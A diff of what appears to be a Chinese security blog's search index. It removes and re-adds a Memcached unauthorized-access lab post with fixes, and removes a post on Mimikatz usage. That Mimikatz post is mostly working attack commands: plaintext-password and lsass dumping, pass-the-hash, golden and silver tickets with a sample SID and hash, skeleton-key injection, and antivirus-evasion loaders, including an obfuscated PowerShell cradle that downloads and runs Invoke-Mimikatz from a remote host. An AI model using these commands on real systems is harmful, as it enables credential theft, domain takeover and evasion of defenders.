-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install memcached</span><br></pre></td></tr></table></figure>
-
-<p><strong>FreeBSD</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">portmaster databases/memcached</span><br></pre></td></tr></table></figure>
-
-
-
-<p>安装完后可以使用 whereis 查看命令的路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whereis memcached</span><br></pre></td></tr></table></figure>
-
-
-
-<p>安装完成后，启动Mecached</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: /usr/bin/memcached  -u root -p 11211 -m 64m -vv</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/77972532663466b685d87df4f73addb5.png" class>
-
-
-
-<p>使用netstat -an | more查看端口监听情况，回显0.0.0.0:<strong>11211</strong>表示在所有网卡进行监听</p>
-<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1b48f94a16e35db707079e0508b68384.png" class>
-
-
-
-<p>使用telnet连接11211端口，没有使用账号密码登录登陆成功</p>
-<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/8888a9b284940445c4e06401f7c9219b.png" class>
-
-
-
-<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1)配置访问控制。建议用户不要将服务发布到互联网上以防被黑客利用而可以通过安全组规则或<br>Iptables 配置访问控制规则只允许内部必需的用户地址访问命令如下 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp  -s  xxx.xxx.xxx.xxx  --dport  11211  -j ACCEPT</span><br></pre></td></tr></table></figure>
-
-
-
-<p>(2) bind 指定监听 IP。如果 Memcached 没有在外网开放的必要可在 Memcached<br>启动时指定绑定的 IP 地址为 127.0.0.1。例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
-
-
-
-<p>(3) 最小化权限运行。使用普通权限账号运行以下指定 memcached 用户运行 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
-
-
-
-<p>(4) 修改默认端口。修改默认 11211 监听端口为 11222 端口 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
-
-
-
-<p>(5) 备份数据。为避免数据丢失升级前应做好备份或建立硬盘快照。</p>
-]]></content>
-      <categories>
-        <category>Web漏洞</category>
-        <category>未授权访问</category>
-      </categories>
-      <tags>
-        <tag>-Web漏洞 -未授权访问 -Memcached</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mimikatz运行姿势</title>
-    <url>/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/</url>
-    <content><![CDATA[<h1 id="Mimikatz运行姿势"><a href="#Mimikatz运行姿势" class="headerlink" title="Mimikatz运行姿势"></a>Mimikatz运行姿势</h1><hr>
-<p>上篇文章记录了Mimikatz神器的基本命令和很多模块的使用方法命令。由于在实际环境中可能会产生不同的问题，这篇文章记录学习Mimikatz工具的使用姿势和一些免杀方法。</p>
-<h2 id="获取本地账户密码"><a href="#获取本地账户密码" class="headerlink" title="获取本地账户密码"></a>获取本地账户密码</h2><hr>
-<h3 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h3><p>首先将执行权限提升为debug权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103351984.png" class title="image-20211103103351984">
-
-
-
-<p>使用sekurlsa模块抓取明文密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103420451.png" class title="image-20211103103420451">
-
-
-
-<p>注:当目标为win10或2012R2以上时，默认禁止在内存中保存明文密码，但可以通过修改注册表的方式来抓取明文。</p>
-<p>修改命令如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Sec urityProviders\WDigest  /v UseLogonCredential /t REG_DWORD  /d  1  /f</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103105046333.png" class title="image-20211103105046333">
-
-
-
-<h3 id="SAM表离线获取hash"><a href="#SAM表离线获取hash" class="headerlink" title="SAM表离线获取hash"></a>SAM表离线获取hash</h3><p>导出SAM数据库的数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg  save  HKLM\SYSTEM  SYSTEM(自定义名称)</span><br><span class="line"></span><br><span class="line">reg  save  HKLM\SAM SAM(自定义名称)</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110249663.png" class title="image-20211103110249663">
-
-
-
-<p>提取导出SAM数据中的hash(确保Mimikatz和导出文件在同一目录下或者指定SAM数据的绝对&#x2F;相对路径)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::sam /sam:SAM(自定义名称)  /system:SYSTEM(自定义名称)</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110638898.png" class title="image-20211103110638898">
-
-
-
-<h2 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h2><hr>
-<p>当mimikatz无法在目标主机上正常运行时，可以使用微软提供的工具Procdump导出lsass.exe进程</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procsump64.exe -accepteula -ma lsass.exe  lsass.tmp</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103111347692.png" class title="image-20211103111347692">
-
-
-
-<p>使用 mimikatz的sekurlsa模块对导出的lsass.dmp文件。先使用minidump恢复到lsass.exe的状态，然后使用logonpasswords导出明文密码信息</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103113844380.png" class title="image-20211103113844380">
-
-
-
-<p>可看到passwords.txt文档中系统的明文密码信息</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103115851943.png" class title="image-20211103115851943">
-
-
-
-<h2 id="哈希传递攻击PTH"><a href="#哈希传递攻击PTH" class="headerlink" title="哈希传递攻击PTH"></a>哈希传递攻击PTH</h2><hr>
-<h3 id="工作组环境"><a href="#工作组环境" class="headerlink" title="工作组环境"></a>工作组环境</h3><p>当我们获取到某一台主机中用户的NTLM哈希值时，可以直接将获取到的NTLM哈希值登录目标主机</p>
-<p>命令；</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa:pt /user:用户名   /domain:ip地址    /ntlm:用户的ntlm哈希值</span><br></pre></td></tr></table></figure>
-
-<p>如下所示，我们可以直接登录目标主机cmd管理窗口，执行命令</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103130911394.png" class title="image-20211103130911394">
-
-<p>注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令</p>
-<h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><p>在域环境下，如果获取到某一用户的ntlm哈希值，可以在域环境下任意主机登录用户，若获取到域控 管理员的账号和ntlm哈希值即可 登录域控。</p>
-<p>命令:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa:pth  /user:用户  /domain:&quot;域名&quot;  /ntlm:用户ntlm哈希值</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><hr>
-<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>在域环境下，每个用户的ticcket都是由krbtgt的密码NTLM哈希进行加密传输的，只要获取到krbtgt用户的密码NTLM哈希值就可以随意伪造Ticket，从而使用Ticket登录域控，使用krbtgt用户密码HTLM哈希生成的票据为黄金票据</p>
-<p>首先获取krbtft用户的NTLM哈希值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz  &quot;lsamdump::dcsync  /domain:xxx.com  /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>利用mimikatz生成域管理员权限的黄金票据，输入域管理员对应的账号，域名称和sid值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:xxx.COM /sid:管理员SID值 /krbtgt:krbtgt用户的哈希值 /ticket:test.kiribi(生成的票据)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>导出上面生成的票据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt  test.kiribi</span><br></pre></td></tr></table></figure>
-
-
-
-<p>查看导入后获取的域管权限，查看主机的目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir  \\$DC$.xxx.com\c$</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据是伪造 TGS(票据授权服务)，只能访问指定的服务，由客户端计算机账号的NTLM哈希值进行加密。</p>
-<p>下面使用白银票据伪造CIFS(用于Windows主机之间进行网络文件共享)服务权限</p>
-<p>提升权限，获取主机账号的哈希值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103161547663.png" class title="image-20211103161547663">
-
-<p>这里的liukaifeng01的SID为S-1-5-21-295270202-1353902439-2381782089(不要后面的-1000)</p>
-<p>伪造的OWA的NTLM哈希为84883cf100e1f84e2a2468f08d6d0e4f</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162043108.png" class title="image-20211103162043108">
-
-
-
-<p>生成白银票据命令 :</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:[domain] /sid:[SID] /target:服务用户.xxx.com /rc4:[server&#x27;s Hash] /service:[service] /user:[username] /ptt</span><br></pre></td></tr></table></figure>
-
-
-
-<p>如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:GOD /sid:S-1-5-21-295270202-1353902439-2381782089( /target:OWA.GOD.com /rc4:84883cf100e1f84e2a2468f08d6d0e4f /service:cifs /user:liukaifeng01 /ptt</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162850526.png" class title="image-20211103162850526">
-
-<p>可以看到此时的liukaifeng01的key变成了OWA的，服务为cifs，生成了获取cifs的白银票据</p>
-<p>伪造白银票据后，我们就可以远程访问DC</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103163128580.png" class title="image-20211103163128580">
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注:若使用dir \\主机名\c$不能访问，则输入主机全名dir \\主机名.域名.com\c$</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="万能密钥"><a href="#万能密钥" class="headerlink" title="万能密钥"></a>万能密钥</h3><p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效</p>
-<p>在域控上安装skeleton key</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;misc::skeleton&quot;</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103171351475.png" class title="image-20211103171351475">
-
-
-
-<p>在域内其他机器使用skeleton key去访问域控，添加密码围殴mimikatz</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net  use   \\主机名.xxx.com\c$  mimikatz(密码)  /user:adtest \administrator</span><br></pre></td></tr></table></figure>
-
-
-
-<p>微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。</p>
-<p>但mimikatz依然可以绕过，需要导入mimidrv.sys文件，命令如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove </span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103172059633.png" class title="image-20211103172059633">
-
-
-
-<h2 id="免杀处理"><a href="#免杀处理" class="headerlink" title="免杀处理"></a>免杀处理</h2><hr>
-<h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>在powershell中导入invoke-Mimikatz.ps1，加载mimikatz模块</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass “import-module .Invoke-Mimikatz.ps1”</span><br></pre></td></tr></table></figure>
-
-<p>运行mimikazt模块</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass “invoke-Mimikatz”</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103194723187.png" class title="image-20211103194723187">
-
-<p>在cmd中运行过程中没有被拦截</p>
-<p>使用poweshell加载远程服务器的ps脚本，会被360拦截</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200143717.png" class title="image-20211103200143717">
-
-
-
-<p>稍微做了简单的混淆</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot; (&#x27;IEX &#x27;+&#x27;(Ne&#x27;+&#x27;w-O&#x27;+&#x27;bject Ne&#x27;+&#x27;t.W&#x27;+&#x27;ebClien&#x27;+&#x27;t).Do&#x27;+&#x27;wnloadS&#x27;+&#x27;trin&#x27;+&#x27;g&#x27;+&#x27;(&#x27;+&#x27;1vchttp://&#x27;+&#x27;192.168.211&#x27;+&#x27;.1/&#x27;+&#x27;Inv&#x27;+&#x27;oke-Mimik&#x27;+&#x27;a&#x27;+&#x27;tz.&#x27;+&#x27;ps11v&#x27;+&#x27;c)&#x27;+&#x27;;&#x27;+&#x27;I&#x27;+&#x27;nvoke-Mimika&#x27;+&#x27;tz&#x27;).REplaCE(&#x27;1vc&#x27;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure>
-
-<p>还是被拦截</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200627835.png" class title="image-20211103200627835">
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200702681.png" class title="image-20211103200702681">
-
-
-
-<p>所以最好将Invoke-Mimikatz.ps1文件放置在目标主机上执行powershell加载模块运行imikatz</p>
-<h3 id="使用-net2-0"><a href="#使用-net2-0" class="headerlink" title="使用.net2.0"></a>使用.net2.0</h3><p>首先下载<a href="https://raw.githubusercontent.com/ssssanr/Mimikatz-Csharp/master/katz.cs">katz.cs</a>，将katz.cs文件保存到本地</p>
-<p>并放在对应的系统版本的Framework目录中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位：C:\Windows\Microsoft.NET\Framework\v2.0.50727</span><br><span class="line">64位：C:\Windows\Microsoft.NET\Framework64\v2.0.50727</span><br></pre></td></tr></table></figure>
-
-
-
-<p>然后在powershell中执行命令生成key.snk</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$key=&#x27;BwIA AAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z 6 4cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5cl HIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#x27;</span><br><span class="line"></span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line"></span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202206247.png" class title="image-20211103202206247">
-
-
-
-<p>最后生成mimikatz，在运行mimikatz</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br><span class="line">64位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.5072 7&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>在运行时被360发现啦，火绒没有反应</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202433218.png" class title="image-20211103202433218">
-
-
-
-<h3 id="使用-net4-0"><a href="#使用-net4-0" class="headerlink" title="使用.net4.0"></a>使用.net4.0</h3><p>下载[mimikatz.xml](<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes</a> mimikatz.xml)，将其保存在Framework64文件下的v4,0文件下并运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msbuild.exe mimikatz.xml</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103203026847.png" class title="image-20211103203026847">
-
-<p>360和火绒都没有报毒和进行拦截</p>
-<h3 id="js加载mimikatz"><a href="#js加载mimikatz" class="headerlink" title="js加载mimikatz"></a>js加载mimikatz</h3><p>下载<a href="https://gist.github.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js">katz.js</a>，执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scsript mimikatz.js</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204511543.png" class title="image-20211103204511543">
-
-
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204537821.png" class title="image-20211103204537821">
-
-<p>360拦截了，火绒没绕过</p>
-<h3 id="jscript的xsl版"><a href="#jscript的xsl版" class="headerlink" title="jscript的xsl版"></a>jscript的xsl版</h3><p>本地加载mimikatz.xsl文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic os get /format:&quot;mimikatz.xsl&quot;</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204250467.png" class title="image-20211103204250467">
-
-<p>360和火绒都没有拦截</p>
-<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><hr>
-<h3 id="导出chrome中的密码"><a href="#导出chrome中的密码" class="headerlink" title="导出chrome中的密码"></a>导出chrome中的密码</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd">使用mimikatz导出chrome中的密码 (qq.com)</a></p>
-<h3 id="隐藏功能"><a href="#隐藏功能" class="headerlink" title="隐藏功能"></a>隐藏功能</h3><p>管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Copyprivilege::debug</span><br><span class="line">misc::cmd</span><br><span class="line">misc::regedit</span><br><span class="line">misc::taskmgr</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-        <category>渗透工具</category>
-      </categories>
-      <tags>
-        <tag>-内网渗透 -工具使用 -免杀处理</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MSSQL注入学习</title>
     <url>/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="MSSQL注入学习"><a href="#MSSQL注入学习" class="headerlink" title="MSSQL注入学习"></a>MSSQL注入学习</h1><p>对于SQL注入来说，之前只在项目中接触过MYSQL和Postgresql注入，这次记录下前辈在某系统后台挖掘的MSSQL注入。</p>
@@ -1627,6 +1316,81 @@
       </categories>
       <tags>
         <tag>-web漏洞 -SQL注入 -MSSQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Memcached 未授权访问漏洞</title>
+    <url>/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Memcached-未授权访问漏洞CVE-2013-7239"><a href="#Memcached-未授权访问漏洞CVE-2013-7239" class="headerlink" title="Memcached 未授权访问漏洞CVE-2013-7239"></a><strong>Memcached 未授权访问漏洞CVE-2013-7239</strong></h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>(1) 漏洞简述Memcached 是一套分布式高速缓存系统。它以 Key - Value<br>的形式将数据存储在内存中。这些数据通常是会被频繁地应用、读取的。正因为内存中数据的读取速度远远大于硬盘的读取速度所以可以用来加速应用的访问。由于<br>Memcached 的安全设计缺陷客户端连接 Memcached<br>服务器后无需认证就可读取、修改服务器缓存内容。</p>
+<p>(2) 风险等级高风险。</p>
+<p>(3) 漏洞编号CVE-2013-7239 。</p>
+<p>(4) 影响范围Memcached 全版本。</p>
+<h2 id="安装-Memcached"><a href="#安装-Memcached" class="headerlink" title="安装 Memcached"></a>安装 Memcached</h2><p>Linux系统安装memcached，首先要先安装libevent库。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libevent ibevent-dev     </span><br><span class="line">自动下载安装（Ubuntu/Debian）</span><br><span class="line"></span><br><span class="line">yum install libevent libevent-devel</span><br><span class="line">自动下载安装（Redhat/Fedora/Centos）</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="自动安装"><a href="#自动安装" class="headerlink" title="自动安装"></a>自动安装</h2><p><strong>Ubuntu&#x2F;Debian</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install memcached</span><br></pre></td></tr></table></figure>
+
+<p><strong>Redhat&#x2F;Fedora&#x2F;Centos</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install memcached</span><br></pre></td></tr></table></figure>
+
+<p><strong>FreeBSD</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">portmaster databases/memcached</span><br></pre></td></tr></table></figure>
+
+
+
+<p>安装完后可以使用 whereis 查看命令的路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whereis memcached</span><br></pre></td></tr></table></figure>
+
+
+
+<p>安装完成后，启动Mecached</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: /usr/bin/memcached  -u root -p 11211 -m 64m -vv</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/77972532663466b685d87df4f73addb5.png" class>
+
+
+
+<p>使用netstat -an | more查看端口监听情况，回显0.0.0.0:<strong>11211</strong>表示在所有网卡进行监听</p>
+<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1b48f94a16e35db707079e0508b68384.png" class>
+
+
+
+<p>使用telnet连接11211端口，没有使用账号密码登录登陆成功</p>
+<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/8888a9b284940445c4e06401f7c9219b.png" class>
+
+
+
+<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1)配置访问控制。建议用户不要将服务发布到互联网上以防被黑客利用而可以通过安全组规则或<br>Iptables 配置访问控制规则只允许内部必需的用户地址访问命令如下 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp  -s  xxx.xxx.xxx.xxx  --dport  11211  -j ACCEPT</span><br></pre></td></tr></table></figure>
+
+
+
+<p>(2) bind 指定监听 IP。如果 Memcached 没有在外网开放的必要可在 Memcached<br>启动时指定绑定的 IP 地址为 127.0.0.1。例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
+
+
+
+<p>(3) 最小化权限运行。使用普通权限账号运行以下指定 memcached 用户运行 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
+
+
+
+<p>(4) 修改默认端口。修改默认 11211 监听端口为 11222 端口 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
+
+
+
+<p>(5) 备份数据。为避免数据丢失升级前应做好备份或建立硬盘快照。</p>
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>未授权访问</category>
+      </categories>
+      <tags>
